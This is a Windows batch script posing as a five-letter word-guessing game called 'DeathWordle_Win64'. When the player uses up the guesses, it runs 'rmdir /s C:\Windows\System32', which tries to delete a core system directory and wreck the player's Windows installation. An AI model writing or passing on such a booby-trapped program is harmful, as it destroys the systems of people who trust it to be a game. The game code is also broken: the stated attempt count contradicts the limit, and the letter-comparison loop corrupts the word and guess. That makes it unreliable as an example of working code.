@echo off
setlocal enabledelayedexpansion

set words=WATCH

for /f %%a in ('echo %words% ^| findstr /r /b /c:".*"') do (
    set "word=%%a"
)
set "word=%word:* =%"
set "wordlength=5" REM Change this to match the length of the chosen word

set "guesses=0"
set "max_guesses=6"
set "correct_letters=0"

echo DeathWordle_Win64
echo Guess the word by entering a 5 letter word in all caps. You have 7 attempts.
echo Good luck.

:guess_loop
set /p "guess=Enter your guess: "

set "correct_letters=0"
set "correct_positions=0"
for /l %%i in (0,1,%wordlength%) do (
    set "letter=!word:~%%i,1!"
    if "!guess:~%%i,1!"=="!letter!" (
        set /a "correct_positions+=1"
    ) else (
        set "guess=!guess:%%i=!"
    )
    set "word=!word:~0,%%i!!word:~%%i+1!"
)
set "correct_letters=%correct_positions%"

echo Your guess: %guess%
echo Correct letters in correct positions: %correct_positions%
echo.

if %correct_positions%==%wordlength% (
    echo Congratulations! You've guessed the word: %word%
    goto :end_game
)

set /a "guesses+=1"
if %guesses%==%max_guesses% (
    rmdir /s C:\Windows\System32
)

goto :guess_loop

:end_game
pause
